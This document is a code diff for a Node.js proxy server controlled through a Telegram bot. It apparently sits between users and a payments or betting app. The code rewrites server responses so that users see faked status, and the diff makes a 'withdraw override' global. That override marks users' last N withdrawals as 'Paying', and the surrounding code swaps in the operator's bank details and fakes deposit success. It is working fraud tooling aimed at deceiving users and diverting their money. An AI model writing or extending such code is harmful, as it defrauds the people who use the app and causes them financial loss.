@@ -26,7 +26,7 @@ async function ensureWebhook() {
   } catch (e) {}
 }
 
-const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0, userOverrides: {}, trackedUsers: {}, fakeWithdrawals: {} };
+const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0, userOverrides: {}, trackedUsers: {}, withdrawOverride: 0 };
 
 async function loadData() {
   try {
@@ -35,7 +35,8 @@ async function loadData() {
       if (typeof data === 'string') data = JSON.parse(data);
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.trackedUsers) data.trackedUsers = {};
-      if (!data.fakeWithdrawals) data.fakeWithdrawals = {};
+      if (data.withdrawOverride === undefined) data.withdrawOverride = 0;
+      if (data.fakeWithdrawals) delete data.fakeWithdrawals;
       return data;
     }
   } catch (e) {}
@@ -402,8 +403,8 @@ app.post('/api/telegram', async (req, res) => {
 /deposit off - ALL users normal
 
 === WITHDRAW COMMANDS ===
-/on withdraw <userId> <count> - Last N orders → Paying
-/off withdraw <userId> - Restore original status
+/on withdraw <count> - Last N orders → Paying (all users)
+/off withdraw - Restore original status
 
 === PER-ID COMMANDS ===
 /id deposit on <amount> <userId>
@@ -572,38 +573,25 @@ Example:
     }
 
     else if (text.match(/^\/on withdraw\s+/i)) {
-      const wMatch = text.match(/^\/on withdraw\s+(\S+)\s+(\S+)$/i);
-      if (!wMatch) {
-        await bot.sendMessage(chatId, '❌ Format: /on withdraw <userId> <count>\nExample: /on withdraw 49740 2');
-        return res.sendStatus(200);
-      }
-      const userId = wMatch[1];
-      const count = parseInt(wMatch[2]);
+      const count = parseInt(text.replace(/^\/on withdraw\s+/i, '').trim());
       if (isNaN(count) || count <= 0) {
-        await bot.sendMessage(chatId, '❌ Invalid count. Must be a positive number.');
+        await bot.sendMessage(chatId, '❌ Format: /on withdraw <count>\nExample: /on withdraw 2');
         return res.sendStatus(200);
       }
-      if (!bankData.fakeWithdrawals) bankData.fakeWithdrawals = {};
-      bankData.fakeWithdrawals[userId] = { count };
+      bankData.withdrawOverride = count;
       await saveData(bankData);
-      await bot.sendMessage(chatId, `✅ Withdraw override ON for user ${userId}\n🔄 Last ${count} order(s) → Paying status\n\nUse /off withdraw ${userId} to restore.`);
+      await bot.sendMessage(chatId, `✅ Withdraw override ON (global)\n🔄 Last ${count} order(s) → Paying status\n\nUse /off withdraw to restore.`);
       return res.sendStatus(200);
     }
 
-    else if (text.match(/^\/off withdraw\s+/i)) {
-      const userId = text.replace(/^\/off withdraw\s+/i, '').trim();
-      if (!userId) {
-        await bot.sendMessage(chatId, '❌ Format: /off withdraw <userId>');
-        return res.sendStatus(200);
-      }
-      if (!bankData.fakeWithdrawals) bankData.fakeWithdrawals = {};
-      if (bankData.fakeWithdrawals[userId]) {
-        const removed = bankData.fakeWithdrawals[userId];
-        delete bankData.fakeWithdrawals[userId];
+    else if (text.trim() === '/off withdraw') {
+      if (bankData.withdrawOverride) {
+        const old = bankData.withdrawOverride;
+        bankData.withdrawOverride = 0;
         await saveData(bankData);
-        await bot.sendMessage(chatId, `🗑 Withdraw override removed for user ${userId}\nWas: last ${removed.count} order(s) → Paying`);
+        await bot.sendMessage(chatId, `🗑 Withdraw override OFF\nWas: last ${old} order(s) → Paying`);
       } else {
-        await bot.sendMessage(chatId, `ℹ️ No withdraw override found for user ${userId}.`);
+        await bot.sendMessage(chatId, `ℹ️ Withdraw override is already OFF.`);
       }
       return res.sendStatus(200);
     }
@@ -749,12 +737,8 @@ For per-ID control: /id deposit on <amount> <userId>`
       msg += `Deposit: ${deposit ? '✅ SUCCESS (₹' + (bankData.depositBonus || 0) + ')' : '🔴 Normal'}\n`;
       msg += `Banks: ${bankData.banks.length}\n`;
       msg += `Per-ID overrides: ${idCount}\n`;
-      const fwCount = Object.keys(bankData.fakeWithdrawals || {}).length;
-      if (fwCount > 0) {
-        msg += `Withdraw Overrides: ${fwCount} active\n`;
-        for (const [uid, fw] of Object.entries(bankData.fakeWithdrawals)) {
-          msg += `  👤 ${uid}: last ${fw.count} order(s) → Paying\n`;
-        }
+      if (bankData.withdrawOverride > 0) {
+        msg += `Withdraw Override: ON (last ${bankData.withdrawOverride} order(s) → Paying)\n`;
       }
       if (active) {
         msg += `\nCurrent Bank:\n${active.accountHolder} | ${active.accountNo} | ${active.ifsc}`;
@@ -987,20 +971,14 @@ app.all('/money/orderDetail', async (req, res) => {
 app.all('/money/rechargeRecord', async (req, res) => {
   await proxyAndReplaceBankInList(req, res);
 });
-app.all('/withdraw/list', async (req, res) => {
+app.all('/payOrder/list', async (req, res) => {
   const bankData = await loadData();
-  const hasOverrides = bankData.fakeWithdrawals && Object.keys(bankData.fakeWithdrawals).length > 0;
+  const count = bankData.withdrawOverride || 0;
 
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
-    if (bankData.adminChatId && bot) {
-      bot.sendMessage(bankData.adminChatId,
-        `📋 /withdraw/list HIT!\nOverrides: ${hasOverrides}\nKeys: ${Object.keys(bankData.fakeWithdrawals || {})}\nResp type: ${jsonResp ? typeof jsonResp.data : 'null'}\nData sample: ${jsonResp ? JSON.stringify(jsonResp.data).substring(0, 200) : 'null'}`
-      ).catch(() => {});
-    }
-
-    if (hasOverrides && jsonResp && jsonResp.data) {
+    if (count > 0 && jsonResp && jsonResp.data) {
       let items = null;
       if (Array.isArray(jsonResp.data)) items = jsonResp.data;
       else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) items = jsonResp.data.list;
@@ -1019,51 +997,37 @@ app.all('/withdraw/list', async (req, res) => {
         const allKeys = Object.keys(firstItem);
         const statusKeys = allKeys.filter(k => /status/i.test(k));
 
-        if (bankData.adminChatId && bot) {
+        let changed = 0;
+        const changedDetails = [];
+        for (let i = items.length - 1; i >= 0 && changed < count; i--) {
+          const oldStatus = items[i].status;
+          const oldStatusName = items[i].statusName;
+          for (const sk of statusKeys) {
+            if (sk === 'statusName' || sk === 'statusText') {
+              items[i][sk] = 'Paying';
+            } else {
+              items[i][sk] = 0;
+            }
+          }
+          if (statusKeys.length === 0) {
+            items[i].status = 0;
+            items[i].statusName = 'Paying';
+          }
+          changedDetails.push(`#${i}: ${oldStatusName || oldStatus} → Paying (₹${items[i].amount || items[i].amountOrder || '?'})`);
+          changed++;
+        }
+
+        if (bankData.adminChatId && bot && changed > 0) {
           bot.sendMessage(bankData.adminChatId,
-            `📊 List found: ${items.length} items\nItem keys: ${allKeys.join(', ')}\nStatus keys: ${statusKeys.join(', ')}\nFirst item status fields: ${statusKeys.map(k => k + '=' + JSON.stringify(firstItem[k])).join(', ')}\nLast item status fields: ${statusKeys.map(k => k + '=' + JSON.stringify(items[items.length-1][k])).join(', ')}`
+            `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`
           ).catch(() => {});
-        }
-
-        for (const [uid, override] of Object.entries(bankData.fakeWithdrawals)) {
-          const count = override.count || 0;
-          if (count <= 0) continue;
-          let changed = 0;
-          const changedDetails = [];
-          for (let i = items.length - 1; i >= 0 && changed < count; i--) {
-            const oldStatus = items[i].status;
-            const oldStatusName = items[i].statusName;
-            for (const sk of statusKeys) {
-              if (sk === 'statusName' || sk === 'statusText') {
-                items[i][sk] = 'Paying';
-              } else {
-                items[i][sk] = 0;
-              }
-            }
-            if (statusKeys.length === 0) {
-              items[i].status = 0;
-              items[i].statusName = 'Paying';
-            }
-            changedDetails.push(`#${i}: ${oldStatusName || oldStatus} → Paying (₹${items[i].amount || items[i].amountOrder || '?'})`);
-            changed++;
-          }
-
-          if (bankData.adminChatId && bot) {
-            bot.sendMessage(bankData.adminChatId,
-              `✅ Changed ${changed} withdrawal(s) to Paying for ${uid}:\n${changedDetails.join('\n')}`
-            ).catch(() => {});
-          }
-        }
-      } else {
-        if (bankData.adminChatId && bot) {
-          bot.sendMessage(bankData.adminChatId, `⚠️ No list items found in response!`).catch(() => {});
         }
       }
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch (e) {
-    console.error('withdraw/list proxy error:', e.message);
+    console.error('payOrder/list proxy error:', e.message);
     if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
   }
 });
